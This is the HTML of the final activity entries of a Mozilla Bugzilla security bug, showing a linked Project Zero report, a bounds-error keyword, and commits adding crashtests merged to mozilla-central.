        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" id="a7342212_406194"><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_406194" id="a7342212_406194"><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a7342212_406194"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a7342212_406194">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a7342212_406194">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-05-25 08:27 PDT" data-time="1495726021">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">URL: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1160" target="_blank" rel="noreferrer"
           class="bug-url" data-safe="1"
        >https://bugs.chromium.org/p/project-z...</a></div></div></div><div class="change-set" id="a7360481_1689"><div class="change" id="aa7360481_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a7360481_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a7360481_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a7360481_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a7360481_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a7360481_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-05-25 13:31 PDT" data-time="1495744290">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-bounds&amp;resolution=---">csectype-bounds</a>, 
          
            <a href="/buglist.cgi?keywords=testcase&amp;resolution=---">testcase</a></div></div></div><div class="change-set" id="c38"><div class="comment" data-id="13440585" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_510726" id="a7360481_1689"><img src="https://secure.gravatar.com/avatar/4c5aee4c6938e29b1576314d2de9c6e7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_510726" id="a7360481_1689"><a class="email " href="/user_profile?user_id=510726" > <span class="fna">Pulsebot</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-01 09:07 PDT" data-time="1530461235">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-38" data-comment-id="13440585">Pushed by <a href="mailto:mpalmgren&#64;mozilla.com">mpalmgren&#64;mozilla.com</a>:
<a rel="nofollow" href="https://hg.mozilla.org/integration/mozilla-inbound/rev/a5e810e1c07c">https://hg.mozilla.org/integration/mozilla-inbound/rev/a5e810e1c07c</a>
Add crashtests.  r=mats</pre></div><div class="change-set" id="a42092287_5168"><div class="change" id="aa42092287_5168">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a42092287_5168"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_5168" id="a42092287_5168"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a42092287_5168"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a42092287_5168">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a42092287_5168">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-01 13:14 PDT" data-time="1530476096">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: in-testsuite? &rarr; in-testsuite+</div></div></div><div class="change-set" id="c39"><div class="comment" data-id="13442893" data-no="39"
       data-tags="bugherder">
    
    <table class="layout-table change-head " id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_601025" id="a42092287_5168"><img src="https://secure.gravatar.com/avatar/421f19b0c1fa16431cb7c8f6b3cdce55?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_601025" id="a42092287_5168"><a class="email disabled" href="/user_profile?user_id=601025" > <span class="fna">Cristina Coroiu [:ccoroiu]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-02 02:57 PDT" data-time="1530525445">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags"><span class="comment-tag">bugherder</span>
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-39" data-comment-id="13442893"><a rel="nofollow" href="https://hg.mozilla.org/mozilla-central/rev/a5e810e1c07c">https://hg.mozilla.org/mozilla-central/rev/a5e810e1c07c</a></pre></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1343552&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>